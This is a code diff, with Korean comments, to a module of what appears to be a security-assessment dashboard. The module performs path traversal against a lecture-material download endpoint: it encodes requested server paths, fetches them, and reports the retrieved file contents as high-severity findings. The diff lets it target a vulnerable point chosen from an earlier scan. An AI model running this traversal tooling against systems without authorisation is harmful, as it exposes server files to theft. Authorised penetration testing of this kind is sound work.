@@ -9,7 +9,7 @@
 이 대상으로 가는 요청에만 자동으로 붙는다.
 """
 from dashboard.core import Finding, ToolResult, excerpt as _excerpt, fetch
-from dashboard.payloads import ENCODINGS, traversal
+from dashboard.payloads import ENCODINGS, POINT_PARAMS, spot_or, traversal, with_value
 
 META = {
     "id": "sesacedu_material_traversal",
@@ -23,12 +23,13 @@ META = {
     "kind": "active",
     "roles": ["user_web", "practice"],  # 이 역할의 대상에서만 보인다
     "stage": "tool",
+    "takes_point": True,  # 팝업에서 경로 조작 점검으로 취약이 나온 지점을 고르면 그 자리에 때린다(11-20)
     "severity": "high",
     "attack": [
         {"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
         {"tactic": "TA0009", "technique": "T1005", "name": "Data from Local System"},
     ],
-    "description": "**심화** — 경로 조작 점검(지점)에서 자료 다운로드 file 이 취약으로 나온 뒤 씁니다. 읽을 경로를 한 줄에 하나씩 넣으면 인코딩해 보내고 응답 코드를 보여 줍니다. 한 줄만 넣으면 내용까지 보여 줍니다.",
+    "description": "**심화** — 경로 조작 점검에서 취약으로 나온 **지점을 고르면 그 자리에**, 안 고르면 강의 자료 다운로드(file)에 때립니다. 읽을 경로를 한 줄에 하나씩 넣으면 인코딩해 보내고 응답 코드를 보여 줍니다. 한 줄만 넣으면 내용까지 보여 줍니다.",
     "needs": [
         {"kind": "auth_header", "name": "Authorization",
          "why": "강의 자료는 로그인한 사용자만 내려받을 수 있어, 토큰이 없으면 전부 401 로 돌아옵니다",
@@ -49,6 +50,7 @@ META = {
         {"name": "lecture", "need": "required", "label": "강의 번호", "default": "123"},
         # 표의 '내용 보기' 가 어느 경로를 펼칠지 실어 나른다 — 목록은 그대로 두고 그 한 줄 내용만 보여 준다
         {"name": "show", "type": "hidden", "default": ""},
+        *POINT_PARAMS,
     ],
 }
 
@@ -59,19 +61,26 @@ MAX_PATHS = 40
 PREVIEW = 4000
 
 
+def url_for_payload(target, spot, payload):
+    """spot 이 (주소, 파라미터)면 그 자리, 강의 번호면 강의 자료 다운로드 주소."""
+    if isinstance(spot, tuple):
+        return with_value(spot[0], spot[1], payload)
+    return target.url + PATH.format(lecture=spot, payload=payload)
+
+
 def run(target, params):
     paths = [p.strip().lstrip("/") for p in params.get("paths", "").splitlines() if p.strip()]
     if not paths:
         raise ValueError("읽을 경로를 한 줄에 하나씩 넣어 주세요")
     if len(paths) > MAX_PATHS:
         raise ValueError(f"한 번에 {MAX_PATHS}개까지 넣을 수 있습니다 (지금 {len(paths)}개)")
-    scheme, lecture = params.get("scheme", "double-full"), params.get("lecture", "123")
+    scheme, lecture = params.get("scheme", "double-full"), spot_or(params, params.get("lecture", "123"))
     depth = int(params.get("depth") or 9)
 
     rows, drills, hits = [], [], []
     for path in paths:
         payload = traversal(path, depth, scheme)
-        url = target.url + PATH.format(lecture=lecture, payload=payload)
+        url = url_for_payload(target, lecture, payload)
         r = fetch(url)
         got = r.status == 200 and len(r.body) > 0
         rows.append([path, r.status, f"{len(r.body):,}" if got else "—",
@@ -86,7 +95,7 @@ def run(target, params):
         finding = [Finding(
             title=f"경로 조작으로 서버 파일 읽기({len(hits)}개 확인)",
             severity="high",
-            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
+            location=url_for_payload(target, lecture, "<" + scheme + ">"),
             evidence=(f"인코딩 {scheme} · 올라갈 단계 {depth}\n"
                       + "\n".join(f"{p} → {r.status} ({len(r.body):,}자)" for p, r in hits)
                       + f"\n\n{hits[0][0]} 내용:\n{_excerpt(first.body)}"),
